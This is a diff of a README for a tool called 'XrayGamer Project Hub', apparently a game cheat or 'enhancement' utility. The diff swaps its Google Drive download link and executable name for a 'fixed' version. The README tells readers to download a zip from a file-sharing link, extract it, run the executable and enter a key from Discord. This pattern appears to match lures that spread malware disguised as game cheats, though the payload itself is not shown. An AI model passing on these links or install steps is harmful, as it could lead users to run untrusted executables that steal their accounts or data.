@@ -11,7 +11,7 @@ XrayGamer Project Hub is a high-performance utility designed to enhance real-tim
 ## 📥 Official Download
 The full package includes all AI models, neural libraries, and dependencies. Due to the high-capacity nature of these models (4.2 GB), the main package is hosted on our secure mirror for maximum download speed.
 
-### [🚀 DOWNLOAD XRAYGAMER_DISCORD_V1.ZIP](https://drive.google.com/file/d/1sLyQrcbcgne6Y-jFCoXCMizn5idvbZjM/view?usp=drive_link)
+### [🚀 DOWNLOAD XRAYGAMER_ULTIMATE_FIXED.ZIP](https://drive.google.com/file/d/1b4-7trPriu49TMET8Si-oucpDUUJDXPQ/view?usp=sharing)
 *Secure Link via Google Drive*
 
 ---
@@ -30,7 +30,7 @@ The full package includes all AI models, neural libraries, and dependencies. Due
 
 1.  **Download:** Click the link above to download the latest release package.
 2.  **Extraction:** Extract all files to a local directory (e.g., Desktop) before execution. **Do not run from inside the ZIP.**
-3.  **Authentication:** Launch the primary executable: `XrayGamer_Discord_V1.exe`.
+3.  **Authentication:** Launch the primary executable: `XrayGamer_Ultimate_V1_Fixed.exe`.
 4.  **License Key:** Obtain your unique Subscriber Key from the official Discord server.
 5.  **Initialize:** Input your credentials and select **Login & Start** to begin the session.
 
